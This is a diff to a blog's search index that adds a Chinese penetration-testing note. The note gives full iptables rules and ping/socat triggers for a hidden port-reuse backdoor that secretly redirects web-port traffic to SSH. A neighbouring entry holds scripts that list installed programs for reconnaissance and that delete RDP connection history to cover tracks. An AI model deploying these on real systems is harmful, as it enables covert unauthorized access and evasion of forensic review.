@@ -1,6 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[技术笔记-2018.3.8]]></title>
+    <url>%2F2018%2F03%2F08%2F%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0-2018-3-8%2F</url>
+    <content type="text"><![CDATA[远程遥控 IPTables 进行端口复用原文地址：远程遥控 IPTables 进行端口复用 第一种方式：利用 ICMP 做遥控开关。缺点在于如果目标在内网，你是无法直接 ping 到它的。 123456789101112131415# 创建端口复用链iptables -t nat -N LETMEIN# 创建端口复用规则，将流量转发至 22 端口iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22# 开启开关，如果接收到一个长为 1139 的 ICMP 包，则将来源 IP 添加到加为letmein的列表中iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1139 -m recent --set --name letmein --rsource -j ACCEPT# 关闭开关，如果接收到一个长为 1140 的 ICMP 包，则将来源 IP 从 letmein 列表中去掉iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1140 -m recent --name letmein --remove -j ACCEPT# let&apos;s do it，如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN 开启复用ping -c 1 -s 1111 192.168.33.78向目标发送一个长度为 1111 的 ICMP 数据包（加上包头28，总长度实际为1139） 关闭复用ping -c 1 -s 1112 192.168.33.78向目标发送一个长度为 1112 的 ICMP 数据包（加上包头 28，总长度实际为 1140） 第二种方式：利用 tcp 数据包中的关键字做遥控开关，不怕目标在内网。 12345678910111213# 端口复用链iptables -t nat -N LETMEIN# 端口复用规则iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22# 开启开关iptables -A INPUT -p tcp -m string --string &apos;threathuntercoming&apos; --algo bm -m recent --set --name letmein --rsource -j ACCEPT# 关闭开关iptables -A INPUT -p tcp -m string --string &apos;threathunterleaving&apos; --algo bm -m recent --name letmein --remove -j ACCEPT# let&apos;s do itiptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN 开启复用，开启后本机到目标 80 端口的流量将转发至目标的 SSH，80 将无法再被本机访问： echo threathuntercoming | socat - tcp:192.168.33.78:80 关闭复用，关闭后，80 恢复正常： echo threathunterleaving | socat - tcp:192.168.33.78:80]]></content>
+      <categories>
+        <category>技术笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title><![CDATA[技术笔记-2018.03.04]]></title>
     <url>%2F2018%2F03%2F04%2F%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0-2018-03-04%2F</url>
     <content type="text"><![CDATA[获取windows当前系统安装程序列表原文链接：渗透基础-获得当前系统已安装的程 利用注册表 https://github.com/3gstudent/ListInstalledPrograms/blob/master/ListInstalledPrograms.ps1 1234567891011121314151617181920212223242526272829303132333435363738&lt;#.SYNOPSISThis script can be used to list the programs that the current Windows system has installed.Supprot x86 and x64 Author: 3gstudent@3gstudentLicense: BSD 3-Clause#&gt;Function ListPrograms&#123; param($RegPath) $QueryPath = dir $RegPath -Name foreach($Name in $QueryPath) &#123; (Get-ItemProperty -Path $RegPath$Name).DisplayName# (Get-ItemProperty -Path $RegPath$Name).Publisher# (Get-ItemProperty -Path $RegPath$Name).DisplayVersion &#125;&#125; if ([IntPtr]::Size -eq 8)&#123; Write-Host &quot;[*] OS: x64&quot; Write-Host &quot;[*] List the 64 bit programs that have been installed&quot; $RegPath = &quot;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\&quot; ListPrograms -RegPath $RegPath Write-Host &quot;[+] List the 32 bit programs that have been installed&quot; $RegPath = &quot;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\&quot; ListPrograms -RegPath $RegPath &#125;else&#123; Write-Host &quot;[*] OS: x86&quot; Write-Host &quot;[*] List the 32 bit programs that have been installed&quot; $RegPath = &quot;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\&quot; ListPrograms -RegPath $RegPath&#125; ​ 利用快捷方式 1wmic PATH Win32_ShortcutFile get name /FORMAT:table ​ 清楚远程桌面登录记录原文链接：how-to-clear-rdp-connections-history bat脚本 1234567@echo offreg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /freg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /freg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;cd %userprofile%\documents\attrib Default.rdp -s -hdel Default.rdp powershell脚本 12345Get-ChildItem &quot;HKCU:\Software\Microsoft\Terminal Server Client&quot; -Recurse | Remove-ItemProperty -Name UsernameHint -Ea 0 Remove-Item -Path &apos;HKCU:\Software\Microsoft\Terminal Server Client\servers&apos; -Recurse 2&gt;&amp;1 | Out-Null Remove-ItemProperty -Path &apos;HKCU:\Software\Microsoft\Terminal Server Client\Default&apos; &apos;MR*&apos; 2&gt;&amp;1 | Out-Null $docs = [environment]::getfolderpath(&quot;mydocuments&quot;) + &apos;\Default.rdp&apos; remove-item $docs -Force 2&gt;&amp;1 | Out-Null 利用提示：在信息收集的时候可以利用这些注册表位置收集目标机器上rdp登录记录]]></content>
@@ -1175,10 +1183,10 @@
         <category>技术文章</category>
       </categories>
       <tags>
-        <tag>win2003</tag>
         <tag>L2TP</tag>
         <tag>ppp</tag>
         <tag>vpn</tag>
+        <tag>win2003</tag>
       </tags>
   </entry>
   <entry>
